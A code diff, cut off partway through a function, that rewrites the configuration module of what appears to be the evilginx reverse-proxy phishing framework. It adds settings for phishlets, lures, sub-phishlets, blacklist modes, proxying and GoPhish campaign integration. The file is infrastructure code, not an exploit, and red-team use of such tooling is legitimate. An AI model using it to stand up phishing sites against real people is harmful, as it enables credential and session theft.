@@ -2,6 +2,7 @@ package core
 
 import (
 	"fmt"
+	"net/url"
 	"os"
 	"path/filepath"
 	"strings"
@@ -11,82 +12,117 @@ import (
 	"github.com/spf13/viper"
 )
 
+var BLACKLIST_MODES = []string{"all", "unauth", "noadd", "off"}
+
 type Lure struct {
-	Hostname        string `mapstructure:"hostname" yaml:"hostname"`
-	Path            string `mapstructure:"path" yaml:"path"`
-	RedirectUrl     string `mapstructure:"redirect_url" yaml:"redirect_url"`
-	Phishlet        string `mapstructure:"phishlet" yaml:"phishlet"`
-	Template        string `mapstructure:"template" yaml:"template"`
-	UserAgentFilter string `mapstructure:"ua_filter" yaml:"ua_filter"`
-	Info            string `mapstructure:"info" yaml:"info"`
-	OgTitle         string `mapstructure:"og_title" yaml:"og_title"`
-	OgDescription   string `mapstructure:"og_desc" yaml:"og_desc"`
-	OgImageUrl      string `mapstructure:"og_image" yaml:"og_image"`
-	OgUrl           string `mapstructure:"og_url" yaml:"og_url"`
+	Id              string `mapstructure:"id" json:"id" yaml:"id"`
+	Hostname        string `mapstructure:"hostname" json:"hostname" yaml:"hostname"`
+	Path            string `mapstructure:"path" json:"path" yaml:"path"`
+	RedirectUrl     string `mapstructure:"redirect_url" json:"redirect_url" yaml:"redirect_url"`
+	Phishlet        string `mapstructure:"phishlet" json:"phishlet" yaml:"phishlet"`
+	Redirector      string `mapstructure:"redirector" json:"redirector" yaml:"redirector"`
+	UserAgentFilter string `mapstructure:"ua_filter" json:"ua_filter" yaml:"ua_filter"`
+	Info            string `mapstructure:"info" json:"info" yaml:"info"`
+	OgTitle         string `mapstructure:"og_title" json:"og_title" yaml:"og_title"`
+	OgDescription   string `mapstructure:"og_desc" json:"og_desc" yaml:"og_desc"`
+	OgImageUrl      string `mapstructure:"og_image" json:"og_image" yaml:"og_image"`
+	OgUrl           string `mapstructure:"og_url" json:"og_url" yaml:"og_url"`
+	PausedUntil     int64  `mapstructure:"paused" json:"paused" yaml:"paused"`
+}
+
+type SubPhishlet struct {
+	Name       string            `mapstructure:"name" json:"name" yaml:"name"`
+	ParentName string            `mapstructure:"parent_name" json:"parent_name" yaml:"parent_name"`
+	Params     map[string]string `mapstructure:"params" json:"params" yaml:"params"`
+}
+
+type PhishletConfig struct {
+	Hostname  string `mapstructure:"hostname" json:"hostname" yaml:"hostname"`
+	UnauthUrl string `mapstructure:"unauth_url" json:"unauth_url" yaml:"unauth_url"`
+	Enabled   bool   `mapstructure:"enabled" json:"enabled" yaml:"enabled"`
+	Visible   bool   `mapstructure:"visible" json:"visible" yaml:"visible"`
+}
+
+type ProxyConfig struct {
+	Type     string `mapstructure:"type" json:"type" yaml:"type"`
+	Address  string `mapstructure:"address" json:"address" yaml:"address"`
+	Port     int    `mapstructure:"port" json:"port" yaml:"port"`
+	Username string `mapstructure:"username" json:"username" yaml:"username"`
+	Password string `mapstructure:"password" json:"password" yaml:"password"`
+	Enabled  bool   `mapstructure:"enabled" json:"enabled" yaml:"enabled"`
+}
+
+type BlacklistConfig struct {
+	Mode string `mapstructure:"mode" json:"mode" yaml:"mode"`
+}
+
+type CertificatesConfig struct {
+}
+
+type GoPhishConfig struct {
+	AdminUrl    string `mapstructure:"admin_url" json:"admin_url" yaml:"admin_url"`
+	ApiKey      string `mapstructure:"api_key" json:"api_key" yaml:"api_key"`
+	InsecureTLS bool   `mapstructure:"insecure" json:"insecure" yaml:"insecure"`
+}
+
+type GeneralConfig struct {
+	Domain       string `mapstructure:"domain" json:"domain" yaml:"domain"`
+	OldIpv4      string `mapstructure:"ipv4" json:"ipv4" yaml:"ipv4"`
+	ExternalIpv4 string `mapstructure:"external_ipv4" json:"external_ipv4" yaml:"external_ipv4"`
+	BindIpv4     string `mapstructure:"bind_ipv4" json:"bind_ipv4" yaml:"bind_ipv4"`
+	UnauthUrl    string `mapstructure:"unauth_url" json:"unauth_url" yaml:"unauth_url"`
+	HttpsPort    int    `mapstructure:"https_port" json:"https_port" yaml:"https_port"`
+	DnsPort      int    `mapstructure:"dns_port" json:"dns_port" yaml:"dns_port"`
+	Autocert     bool   `mapstructure:"autocert" json:"autocert" yaml:"autocert"`
 }
 
 type Config struct {
-	siteDomains       map[string]string
-	baseDomain        string
-	serverIP          string
-	proxyType         string
-	proxyAddress      string
-	proxyPort         int
-	proxyUsername     string
-	proxyPassword     string
-	blackListMode     string
-	proxyEnabled      bool
-	sitesEnabled      map[string]bool
-	sitesHidden       map[string]bool
-	phishlets         map[string]*Phishlet
-	phishletNames     []string
-	activeHostnames   []string
-	redirectParam     string
-	verificationParam string
-	verificationToken string
-	redirectUrl       string
-	templatesDir      string
-	lures             []*Lure
-	cfg               *viper.Viper
+	general         *GeneralConfig
+	certificates    *CertificatesConfig
+	blacklistConfig *BlacklistConfig
+	gophishConfig   *GoPhishConfig
+	proxyConfig     *ProxyConfig
+	phishletConfig  map[string]*PhishletConfig
+	phishlets       map[string]*Phishlet
+	phishletNames   []string
+	activeHostnames []string
+	redirectorsDir  string
+	lures           []*Lure
+	lureIds         []string
+	subphishlets    []*SubPhishlet
+	cfg             *viper.Viper
 }
 
 const (
-	CFG_SITE_DOMAINS       = "site_domains"
-	CFG_BASE_DOMAIN        = "server"
-	CFG_SERVER_IP          = "ip"
-	CFG_SITES_ENABLED      = "sites_enabled"
-	CFG_SITES_HIDDEN       = "sites_hidden"
-	CFG_REDIRECT_PARAM     = "redirect_key"
-	CFG_VERIFICATION_PARAM = "verification_key"
-	CFG_VERIFICATION_TOKEN = "verification_token"
-	CFG_REDIRECT_URL       = "redirect_url"
-	CFG_LURES              = "lures"
-	CFG_PROXY_TYPE         = "proxy_type"
-	CFG_PROXY_ADDRESS      = "proxy_address"
-	CFG_PROXY_PORT         = "proxy_port"
-	CFG_PROXY_USERNAME     = "proxy_username"
-	CFG_PROXY_PASSWORD     = "proxy_password"
-	CFG_PROXY_ENABLED      = "proxy_enabled"
-	CFG_BLACKLIST_MODE     = "blacklist_mode"
+	CFG_GENERAL      = "general"
+	CFG_CERTIFICATES = "certificates"
+	CFG_LURES        = "lures"
+	CFG_PROXY        = "proxy"
+	CFG_PHISHLETS    = "phishlets"
+	CFG_BLACKLIST    = "blacklist"
+	CFG_SUBPHISHLETS = "subphishlets"
+	CFG_GOPHISH      = "gophish"
 )
 
-const DEFAULT_REDIRECT_URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ" // Rick'roll
+const DEFAULT_UNAUTH_URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ" // Rick'roll
 
 func NewConfig(cfg_dir string, path string) (*Config, error) {
 	c := &Config{
-		siteDomains:   make(map[string]string),
-		sitesEnabled:  make(map[string]bool),
-		sitesHidden:   make(map[string]bool),
-		phishlets:     make(map[string]*Phishlet),
-		phishletNames: []string{},
-		lures:         []*Lure{},
+		general:         &GeneralConfig{},
+		certificates:    &CertificatesConfig{},
+		gophishConfig:   &GoPhishConfig{},
+		phishletConfig:  make(map[string]*PhishletConfig),
+		phishlets:       make(map[string]*Phishlet),
+		phishletNames:   []string{},
+		lures:           []*Lure{},
+		blacklistConfig: &BlacklistConfig{},
 	}
 
 	c.cfg = viper.New()
-	c.cfg.SetConfigType("yaml")
+	c.cfg.SetConfigType("json")
 
 	if path == "" {
-		path = filepath.Join(cfg_dir, "config.yaml")
+		path = filepath.Join(cfg_dir, "config.json")
 	}
 	err := os.MkdirAll(filepath.Dir(path), os.FileMode(0700))
 	if err != nil {
@@ -107,96 +143,168 @@ func NewConfig(cfg_dir string, path string) (*Config, error) {
 		return nil, err
 	}
 
-	c.baseDomain = c.cfg.GetString(CFG_BASE_DOMAIN)
-	c.serverIP = c.cfg.GetString(CFG_SERVER_IP)
-	c.siteDomains = c.cfg.GetStringMapString(CFG_SITE_DOMAINS)
-	c.redirectParam = c.cfg.GetString(CFG_REDIRECT_PARAM)
-	c.verificationParam = c.cfg.GetString(CFG_VERIFICATION_PARAM)
-	c.verificationToken = c.cfg.GetString(CFG_VERIFICATION_TOKEN)
-	c.redirectUrl = c.cfg.GetString(CFG_REDIRECT_URL)
-	c.proxyType = c.cfg.GetString(CFG_PROXY_TYPE)
-	c.proxyAddress = c.cfg.GetString(CFG_PROXY_ADDRESS)
-	c.proxyPort = c.cfg.GetInt(CFG_PROXY_PORT)
-	c.proxyUsername = c.cfg.GetString(CFG_PROXY_USERNAME)
-	c.proxyPassword = c.cfg.GetString(CFG_PROXY_PASSWORD)
-	c.proxyEnabled = c.cfg.GetBool(CFG_PROXY_ENABLED)
-	c.blackListMode = c.cfg.GetString(CFG_BLACKLIST_MODE)
-	s_enabled := c.cfg.GetStringSlice(CFG_SITES_ENABLED)
-	for _, site := range s_enabled {
-		c.sitesEnabled[site] = true
-	}
-	s_hidden := c.cfg.GetStringSlice(CFG_SITES_HIDDEN)
-	for _, site := range s_hidden {
-		c.sitesHidden[site] = true
+	c.cfg.UnmarshalKey(CFG_GENERAL, &c.general)
+	if c.cfg.Get("general.autocert") == nil {
+		c.cfg.Set("general.autocert", true)
+		c.general.Autocert = true
 	}
 
-	if !stringExists(c.blackListMode, []string{"all", "unauth", "off"}) {
-		c.SetBlacklistMode("off")
-	}
+	c.cfg.UnmarshalKey(CFG_BLACKLIST, &c.blacklistConfig)
 
-	var param string
-	if c.redirectParam == "" {
-		param = strings.ToLower(GenRandomString(2))
-		c.SetRedirectParam(param)
-	}
-	if c.verificationParam == "" {
-		for {
-			param = strings.ToLower(GenRandomString(2))
-			if param != c.redirectParam {
-				break
-			}
+	c.cfg.UnmarshalKey(CFG_GOPHISH, &c.gophishConfig)
+
+	if c.general.OldIpv4 != "" {
+		if c.general.ExternalIpv4 == "" {
+			c.SetServerExternalIP(c.general.OldIpv4)
 		}
-		c.SetVerificationParam(param)
+		c.SetServerIP("")
 	}
-	if c.verificationToken == "" {
-		c.SetVerificationToken(GenRandomToken()[:4])
+
+	if !stringExists(c.blacklistConfig.Mode, BLACKLIST_MODES) {
+		c.SetBlacklistMode("unauth")
 	}
-	if c.redirectUrl == "" && created_cfg {
-		c.SetRedirectUrl(DEFAULT_REDIRECT_URL)
+
+	if c.general.UnauthUrl == "" && created_cfg {
+		c.SetUnauthUrl(DEFAULT_UNAUTH_URL)
 	}
+	if c.general.HttpsPort == 0 {
+		c.SetHttpsPort(443)
+	}
+	if c.general.DnsPort == 0 {
+		c.SetDnsPort(53)
+	}
+	if created_cfg {
+		c.EnableAutocert(true)
+	}
+
 	c.lures = []*Lure{}
 	c.cfg.UnmarshalKey(CFG_LURES, &c.lures)
+	c.proxyConfig = &ProxyConfig{}
+	c.cfg.UnmarshalKey(CFG_PROXY, &c.proxyConfig)
+	c.cfg.UnmarshalKey(CFG_PHISHLETS, &c.phishletConfig)
+	c.cfg.UnmarshalKey(CFG_CERTIFICATES, &c.certificates)
 
+	for i := 0; i < len(c.lures); i++ {
+		c.lureIds = append(c.lureIds, GenRandomToken())
+	}
+
+	c.cfg.WriteConfig()
 	return c, nil
 }
 
-func (c *Config) SetSiteHostname(site string, domain string) bool {
-	if c.baseDomain == "" {
-		log.Error("you need to set server domain, first. type: server your-domain.com")
+func (c *Config) PhishletConfig(site string) *PhishletConfig {
+	if o, ok := c.phishletConfig[site]; ok {
+		return o
+	} else {
+		o := &PhishletConfig{
+			Hostname:  "",
+			UnauthUrl: "",
+			Enabled:   false,
+			Visible:   true,
+		}
+		c.phishletConfig[site] = o
+		return o
+	}
+}
+
+func (c *Config) SavePhishlets() {
+	c.cfg.Set(CFG_PHISHLETS, c.phishletConfig)
+	c.cfg.WriteConfig()
+}
+
+func (c *Config) SetSiteHostname(site string, hostname string) bool {
+	if c.general.Domain == "" {
+		log.Error("you need to set server top-level domain, first. type: server your-domain.com")
 		return false
 	}
-	if _, err := c.GetPhishlet(site); err != nil {
+	pl, err := c.GetPhishlet(site)
+	if err != nil {
 		log.Error("%v", err)
 		return false
 	}
-	if domain != c.baseDomain && !strings.HasSuffix(domain, "."+c.baseDomain) {
-		log.Error("phishlet hostname must end with '%s'", c.baseDomain)
+	if pl.isTemplate {
+		log.Error("phishlet is a template - can't set hostname")
 		return false
 	}
-	c.siteDomains[site] = domain
-	c.cfg.Set(CFG_SITE_DOMAINS, c.siteDomains)
-	log.Info("phishlet '%s' hostname set to: %s", site, domain)
-	c.cfg.WriteConfig()
+	if hostname != "" && hostname != c.general.Domain && !strings.HasSuffix(hostname, "."+c.general.Domain) {
+		log.Error("phishlet hostname must end with '%s'", c.general.Domain)
+		return false
+	}
+	log.Info("phishlet '%s' hostname set to: %s", site, hostname)
+	c.PhishletConfig(site).Hostname = hostname
+	c.SavePhishlets()
+	return true
+}
+
+func (c *Config) SetSiteUnauthUrl(site string, _url string) bool {
+	pl, err := c.GetPhishlet(site)
+	if err != nil {
+		log.Error("%v", err)
+		return false
+	}
+	if pl.isTemplate {
+		log.Error("phishlet is a template - can't set unauth_url")
+		return false
+	}
+	if _url != "" {
+		_, err := url.ParseRequestURI(_url)
+		if err != nil {
+			log.Error("invalid URL: %s", err)
+			return false
+		}
+	}
+	log.Info("phishlet '%s' unauth_url set to: %s", site, _url)
+	c.PhishletConfig(site).UnauthUrl = _url
+	c.SavePhishlets()
 	return true
 }
 
 func (c *Config) SetBaseDomain(domain string) {
-	c.baseDomain = domain
-	c.cfg.Set(CFG_BASE_DOMAIN, c.baseDomain)
+	c.general.Domain = domain
+	c.cfg.Set(CFG_GENERAL, c.general)
 	log.Info("server domain set to: %s", domain)
 	c.cfg.WriteConfig()
 }
 
 func (c *Config) SetServerIP(ip_addr string) {
-	c.serverIP = ip_addr
-	c.cfg.Set(CFG_SERVER_IP, c.serverIP)
-	log.Info("server IP set to: %s", ip_addr)
+	c.general.OldIpv4 = ip_addr
+	c.cfg.Set(CFG_GENERAL, c.general)
+	//log.Info("server IP set to: %s", ip_addr)
+	c.cfg.WriteConfig()
+}
+
+func (c *Config) SetServerExternalIP(ip_addr string) {
+	c.general.ExternalIpv4 = ip_addr
+	c.cfg.Set(CFG_GENERAL, c.general)
+	log.Info("server external IP set to: %s", ip_addr)
+	c.cfg.WriteConfig()
+}
+
+func (c *Config) SetServerBindIP(ip_addr string) {
+	c.general.BindIpv4 = ip_addr
+	c.cfg.Set(CFG_GENERAL, c.general)
+	log.Info("server bind IP set to: %s", ip_addr)
+	log.Warning("you may need to restart evilginx for the changes to take effect")
+	c.cfg.WriteConfig()
+}
+
+func (c *Config) SetHttpsPort(port int) {
+	c.general.HttpsPort = port
+	c.cfg.Set(CFG_GENERAL, c.general)
+	log.Info("https port set to: %d", port)
+	c.cfg.WriteConfig()
+}
+
+func (c *Config) SetDnsPort(port int) {
+	c.general.DnsPort = port
+	c.cfg.Set(CFG_GENERAL, c.general)
+	log.Info("dns port set to: %d", port)
 	c.cfg.WriteConfig()
 }
 
 func (c *Config) EnableProxy(enabled bool) {
-	c.proxyEnabled = enabled
-	c.cfg.Set(CFG_PROXY_ENABLED, c.proxyEnabled)
+	c.proxyConfig.Enabled = enabled
+	c.cfg.Set(CFG_PROXY, c.proxyConfig)
 	if enabled {
 		log.Info("enabled proxy")
 	} else {
@@ -211,44 +319,71 @@ func (c *Config) SetProxyType(ptype string) {
 		log.Error("invalid proxy type selected")
 		return
 	}
-	c.proxyType = ptype
-	c.cfg.Set(CFG_PROXY_TYPE, c.proxyType)
-	log.Info("proxy type set to: %s", c.proxyType)
+	c.proxyConfig.Type = ptype
+	c.cfg.Set(CFG_PROXY, c.proxyConfig)
+	log.Info("proxy type set to: %s", ptype)
 	c.cfg.WriteConfig()
 }
 
 func (c *Config) SetProxyAddress(address string) {
-	c.proxyAddress = address
-	c.cfg.Set(CFG_PROXY_ADDRESS, c.proxyAddress)
-	log.Info("proxy address set to: %s", c.proxyAddress)
+	c.proxyConfig.Address = address
+	c.cfg.Set(CFG_PROXY, c.proxyConfig)
+	log.Info("proxy address set to: %s", address)
 	c.cfg.WriteConfig()
 }
 
 func (c *Config) SetProxyPort(port int) {
-	c.proxyPort = port
-	c.cfg.Set(CFG_PROXY_PORT, c.proxyPort)
-	log.Info("proxy port set to: %d", c.proxyPort)
+	c.proxyConfig.Port = port
+	c.cfg.Set(CFG_PROXY, c.proxyConfig.Port)
+	log.Info("proxy port set to: %d", port)
 	c.cfg.WriteConfig()
 }
 
 func (c *Config) SetProxyUsername(username string) {
-	c.proxyUsername = username
-	c.cfg.Set(CFG_PROXY_USERNAME, c.proxyUsername)
-	log.Info("proxy username set to: %s", c.proxyUsername)
+	c.proxyConfig.Username = username
+	c.cfg.Set(CFG_PROXY, c.proxyConfig)
+	log.Info("proxy username set to: %s", username)
 	c.cfg.WriteConfig()
 }
 
 func (c *Config) SetProxyPassword(password string) {
-	c.proxyPassword = password
-	c.cfg.Set(CFG_PROXY_PASSWORD, c.proxyPassword)
-	log.Info("proxy password set to: %s", c.proxyPassword)
+	c.proxyConfig.Password = password
+	c.cfg.Set(CFG_PROXY, c.proxyConfig)
+	log.Info("proxy password set to: %s", password)
+	c.cfg.WriteConfig()
+}
+
+func (c *Config) SetGoPhishAdminUrl(k string) {
+	u, err := url.ParseRequestURI(k)
+	if err != nil {
+		log.Error("invalid url: %s", err)
+		return
+	}
+
+	c.gophishConfig.AdminUrl = u.String()
+	c.cfg.Set(CFG_GOPHISH, c.gophishConfig)
+	log.Info("gophish admin url set to: %s", u.String())
+	c.cfg.WriteConfig()
+}
+
+func (c *Config) SetGoPhishApiKey(k string) {
+	c.gophishConfig.ApiKey = k
+	c.cfg.Set(CFG_GOPHISH, c.gophishConfig)
+	log.Info("gophish api key set to: %s", k)
+	c.cfg.WriteConfig()
+}
+
+func (c *Config) SetGoPhishInsecureTLS(k bool) {
+	c.gophishConfig.InsecureTLS = k
+	c.cfg.Set(CFG_GOPHISH, c.gophishConfig)
+	log.Info("gophish insecure set to: %v", k)
 	c.cfg.WriteConfig()
 }
 
 func (c *Config) IsLureHostnameValid(hostname string) bool {
 	for _, l := range c.lures {
 		if l.Hostname == hostname {
-			if c.sitesEnabled[l.Phishlet] {
+			if c.PhishletConfig(l.Phishlet).Enabled {
 				return true
 			}
 		}
@@ -257,21 +392,23 @@ func (c *Config) IsLureHostnameValid(hostname string) bool {
 }
 
 func (c *Config) SetSiteEnabled(site string) error {
-	if _, err := c.GetPhishlet(site); err != nil {
+	pl, err := c.GetPhishlet(site)
+	if err != nil {
 		log.Error("%v", err)
 		return err
 	}
-	if !c.IsSiteEnabled(site) {
-		c.sitesEnabled[site] = true
+	if c.PhishletConfig(site).Hostname == "" {
+		return fmt.Errorf("enabling phishlet '%s' requires its hostname to be set up", site)
 	}
+	if pl.isTemplate {
+		return fmt.Errorf("phishlet '%s' is a template - you have to 'create' child phishlet from it, with predefined parameters, before you can enable it.", site)
+	}
+	c.PhishletConfig(site).Enabled = true
 	c.refreshActiveHostnames()
-	var sites []string
-	for s, _ := range c.sitesEnabled {
-		sites = append(sites, s)
-	}
-	c.cfg.Set(CFG_SITES_ENABLED, sites)
+	c.VerifyPhishlets()
 	log.Info("enabled phishlet '%s'", site)
-	c.cfg.WriteConfig()
+
+	c.SavePhishlets()
 	return nil
 }
 
@@ -280,17 +417,11 @@ func (c *Config) SetSiteDisabled(site string) error {
 		log.Error("%v", err)
 		return err
 	}
-	if c.IsSiteEnabled(site) {
-		delete(c.sitesEnabled, site)
-	}
+	c.PhishletConfig(site).Enabled = false
 	c.refreshActiveHostnames()
-	var sites []string
-	for s, _ := range c.sitesEnabled {
-		sites = append(sites, s)
-	}
-	c.cfg.Set(CFG_SITES_ENABLED, sites)
 	log.Info("disabled phishlet '%s'", site)
-	c.cfg.WriteConfig()
+
+	c.SavePhishlets()
 	return nil
 }
 
@@ -299,103 +430,69 @@ func (c *Config) SetSiteHidden(site string, hide bool) error {
 		log.Error("%v", err)
 		return err
 	}
-	if hide {
-		if !c.IsSiteHidden(site) {
-			c.sitesHidden[site] = true
-		}
-	} else {
-		if c.IsSiteHidden(site) {
-			delete(c.sitesHidden, site)
-		}
-	}
+	c.PhishletConfig(site).Visible = !hide
 	c.refreshActiveHostnames()
-	var sites []string
-	for s, _ := range c.sitesHidden {
-		sites = append(sites, s)
-	}
-	c.cfg.Set(CFG_SITES_HIDDEN, sites)
+
 	if hide {
 		log.Info("phishlet '%s' is now hidden and all requests to it will be redirected", site)
 	} else {
 		log.Info("phishlet '%s' is now reachable and visible from the outside", site)
 	}
-	c.cfg.WriteConfig()
+	c.SavePhishlets()
 	return nil
 }
 
-func (c *Config) SetTemplatesDir(path string) {
-	c.templatesDir = path
+func (c *Config) SetRedirectorsDir(path string) {
+	c.redirectorsDir = path
 }
 
 func (c *Config) ResetAllSites() {
-	for s, _ := range c.sitesEnabled {
-		c.SetSiteDisabled(s)
-	}
-	for s, _ := range c.phishlets {
-		c.siteDomains[s] = ""
-	}
-	c.cfg.Set(CFG_SITE_DOMAINS, c.siteDomains)
-	c.cfg.WriteConfig()
+	c.phishletConfig = make(map[string]*PhishletConfig)
+	c.SavePhishlets()
 }
 
 func (c *Config) IsSiteEnabled(site string) bool {
-	s, ok := c.sitesEnabled[site]
-	if !ok {
-		return false
-	}
-	return s
+	return c.PhishletConfig(site).Enabled
 }
 
 func (c *Config) IsSiteHidden(site string) bool {
-	s, ok := c.sitesHidden[site]
-	if !ok {
-		return false
-	}
-	return s
+	return !c.PhishletConfig(site).Visible
 }
 
 func (c *Config) GetEnabledSites() []string {
 	var sites []string
-	for s, _ := range c.sitesEnabled {
-		sites = append(sites, s)
+	for k, o := range c.phishletConfig {
+		if o.Enabled {
+			sites = append(sites, k)
+		}
 	}
 	return sites
 }
 
-func (c *Config) SetRedirectParam(param string) {
-	c.redirectParam = param
-	c.cfg.Set(CFG_REDIRECT_PARAM, param)
-	log.Info("redirect parameter set to: %s", param)
-	c.cfg.WriteConfig()
-}
-
 func (c *Config) SetBlacklistMode(mode string) {
-	if stringExists(mode, []string{"all", "unauth", "off"}) {
-		c.blackListMode = mode
-		c.cfg.Set(CFG_BLACKLIST_MODE, mode)
+	if stringExists(mode, BLACKLIST_MODES) {
+		c.blacklistConfig.Mode = mode
+		c.cfg.Set(CFG_BLACKLIST, c.blacklistConfig)
 		c.cfg.WriteConfig()
 	}
 	log.Info("blacklist mode set to: %s", mode)
 }
 
-func (c *Config) SetVerificationParam(param string) {
-	c.verificationParam = param
-	c.cfg.Set(CFG_VERIFICATION_PARAM, param)
-	log.Info("verification parameter set to: %s", param)
+func (c *Config) SetUnauthUrl(_url string) {
+	c.general.UnauthUrl = _url
+	c.cfg.Set(CFG_GENERAL, c.general)
+	log.Info("unauthorized request redirection URL set to: %s", _url)
 	c.cfg.WriteConfig()
 }
 
-func (c *Config) SetVerificationToken(token string) {
-	c.verificationToken = token
-	c.cfg.Set(CFG_VERIFICATION_TOKEN, token)
-	log.Info("verification token set to: %s", token)
-	c.cfg.WriteConfig()
-}
-
-func (c *Config) SetRedirectUrl(url string) {
-	c.redirectUrl = url
-	c.cfg.Set(CFG_REDIRECT_URL, url)
-	log.Info("unauthorized request redirection URL set to: %s", url)
+func (c *Config) EnableAutocert(enabled bool) {
+	c.general.Autocert = enabled
+	if enabled {
+		log.Info("autocert is now enabled")
+	} else {
+		log.Info("autocert is now disabled")
+	}
+	c.cfg.Set(CFG_GENERAL, c.general)
 	c.cfg.WriteConfig()
 }
 
@@ -407,20 +504,46 @@ func (c *Config) refreshActiveHostnames() {
 		if err != nil {
 			continue
 		}
-		for _, host := range pl.GetPhishHosts() {
-			c.activeHostnames = append(c.activeHostnames, host)
+		for _, host := range pl.GetPhishHosts(false) {
+			c.activeHostnames = append(c.activeHostnames, strings.ToLower(host))
 		}
 	}
 	for _, l := range c.lures {
 		if stringExists(l.Phishlet, sites) {
 			if l.Hostname != "" {
-				c.activeHostnames = append(c.activeHostnames, l.Hostname)
+				c.activeHostnames = append(c.activeHostnames, strings.ToLower(l.Hostname))
 			}
 		}
 	}
 }
 
+func (c *Config) GetActiveHostnames(site string) []string {
+	var ret []string
+	sites := c.GetEnabledSites()
+	for _, _site := range sites {
+		if site == "" || _site == site {
+			pl, err := c.GetPhishlet(_site)
+			if err != nil {
+				continue
+			}
+			for _, host := range pl.GetPhishHosts(false) {
+				ret = append(ret, strings.ToLower(host))
+			}
+		}
+	}
+	for _, l := range c.lures {
+		if site == "" || l.Phishlet == site {
+			if l.Hostname != "" {
+				hostname := strings.ToLower(l.Hostname)
+				ret = append(ret, hostname)
+			}
+		}
+	}
+	return ret
+}
+
 func (c *Config) IsActiveHostname(host string) bool {
+	host = strings.ToLower(host)
 	if host[len(host)-1:] == "." {
 		host = host[:len(host)-1]
 	}
@@ -435,10 +558,130 @@ func (c *Config) IsActiveHostname(host string) bool {
 func (c *Config) AddPhishlet(site string, pl *Phishlet) {
 	c.phishletNames = append(c.phishletNames, site)
 	c.phishlets[site] = pl
+	c.VerifyPhishlets()
+}
+
+func (c *Config) AddSubPhishlet(site string, parent_site string, customParams map[string]string) error {
+	pl, err := c.GetPhishlet(parent_site)
+	if err != nil {
+		return err
+	}
+	_, err = c.GetPhishlet(site)
+	if err == nil {
+		return fmt.Errorf("phishlet '%s' already exists", site)
+	}
+	sub_pl, err := NewPhishlet(site, pl.Path, &customParams, c)
+	if err != nil {
+		return err
+	}
+	sub_pl.ParentName = parent_site
+
+	c.phishletNames = append(c.phishletNames, site)
+	c.phishlets[site] = sub_pl
+	c.VerifyPhishlets()
+
+	return nil
+}
+
+func (c *Config) DeleteSubPhishlet(site string) error {
+	pl, err := c.GetPhishlet(site)
+	if err != nil {
+		return err
+	}
+	if pl.ParentName == "" {
+		return fmt.Errorf("phishlet '%s' can't be deleted - you can only delete child phishlets.", site)
+	}
+
+	c.phishletNames = removeString(site, c.phishletNames)
+	delete(c.phishlets, site)
+	delete(c.phishletConfig, site)
+	c.SavePhishlets()
+	return nil
+}
+
+func (c *Config) LoadSubPhishlets() {
+	var subphishlets []*SubPhishlet
+	c.cfg.UnmarshalKey(CFG_SUBPHISHLETS, &subphishlets)
+	for _, spl := range subphishlets {
+		err := c.AddSubPhishlet(spl.Name, spl.ParentName, spl.Params)
+		if err != nil {
+			log.Error("phishlets: %s", err)
+		}
+	}
+}
+
+func (c *Config) SaveSubPhishlets() {
+	var subphishlets []*SubPhishlet
+	for _, pl := range c.phishlets {
+		if pl.ParentName != "" {
+			spl := &SubPhishlet{
+				Name:       pl.Name,
+				ParentName: pl.ParentName,
+				Params:     pl.customParams,
+			}
+			subphishlets = append(subphishlets, spl)
+		}
+	}
+
+	c.cfg.Set(CFG_SUBPHISHLETS, subphishlets)
+	c.cfg.WriteConfig()
+}
+
+func (c *Config) VerifyPhishlets() {
+	hosts := make(map[string]string)
+
+	for site, pl := range c.phishlets {
+		if pl.isTemplate {
+			continue
+		}
+		for _, ph := range pl.proxyHosts {
+			phish_host := combineHost(ph.phish_subdomain, ph.domain)
+			orig_host := combineHost(ph.orig_subdomain, ph.domain)
+			if c_site, ok := hosts[phish_host]; ok {
+				log.Warning("phishlets: hostname '%s' collision between '%s' and '%s' phishlets", phish_host, site, c_site)
+			} else if c_site, ok := hosts[orig_host]; ok {
+				log.Warning("phishlets: hostname '%s' collision between '%s' and '%s' phishlets", orig_host, site, c_site)
+			}
+			hosts[phish_host] = site
+			hosts[orig_host] = site
+		}
+	}
+}
+
+func (c *Config) CleanUp() {
+
+	for k := range c.phishletConfig {
+		_, err := c.GetPhishlet(k)
+		if err != nil {
+			delete(c.phishletConfig, k)
+		}
+	}
+	c.SavePhishlets()
+	/*
+		var sites_enabled []string
+		var sites_hidden []string
+		for k := range c.siteDomains {
+			_, err := c.GetPhishlet(k)
+			if err != nil {
+				delete(c.siteDomains, k)
+			} else {
+				if c.IsSiteEnabled(k) {
+					sites_enabled = append(sites_enabled, k)
+				}
+				if c.IsSiteHidden(k) {
+					sites_hidden = append(sites_hidden, k)
+				}
+			}
+		}
+		c.cfg.Set(CFG_SITE_DOMAINS, c.siteDomains)
+		c.cfg.Set(CFG_SITES_ENABLED, sites_enabled)
+		c.cfg.Set(CFG_SITES_HIDDEN, sites_hidden)
+		c.cfg.WriteConfig()*/
 }
 
 func (c *Config) AddLure(site string, l *Lure) {
 	c.lures = append(c.lures, l)
+	c.lureIds = append(c.lureIds, GenRandomToken())
 	c.cfg.Set(CFG_LURES, c.lures)
 	c.cfg.WriteConfig()
 }
@@ -457,6 +700,7 @@ func (c *Config) SetLure(index int, l *Lure) error {
 func (c *Config) DeleteLure(index int) error {
 	if index >= 0 && index < len(c.lures) {
 		c.lures = append(c.lures[:index], c.lures[index+1:]...)
+		c.lureIds = append(c.lureIds[:index], c.lureIds[index+1:]...)
 	} else {
 		return fmt.Errorf("index out of bounds: %d", index)
 	}
@@ -467,16 +711,19 @@ func (c *Config) DeleteLure(index int) error {
 
 func (c *Config) DeleteLures(index []int) []int {
 	tlures := []*Lure{}
+	tlureIds := []string{}
 	di := []int{}
 	for n, l := range c.lures {
 		if !intExists(n, index) {
 			tlures = append(tlures, l)
+			tlureIds = append(tlureIds, c.lureIds[n])
 		} else {
 			di = append(di, n)
 		}
 	}
 	if len(di) > 0 {
 		c.lures = tlures
+		c.lureIds = tlureIds
 		c.cfg.Set(CFG_LURES, c.lures)
 		c.cfg.WriteConfig()
 	}
@@ -491,11 +738,16 @@ func (c *Config) GetLure(index int) (*Lure, error) {
 	}
 }
 
-func (c *Config) GetLureByPath(site string, path string) (*Lure, error) {
+func (c *Config) GetLureByPath(site string, host string, path string) (*Lure, error) {
 	for _, l := range c.lures {
 		if l.Phishlet == site {
-			if l.Path == path {
-				return l, nil
+			pl, err := c.GetPhishlet(site)
+			if err == nil {
+				if host == l.Hostname || host == pl.GetLandingPhishHost() {
+					if l.Path == path {
+						return l, nil
+					}
+				}
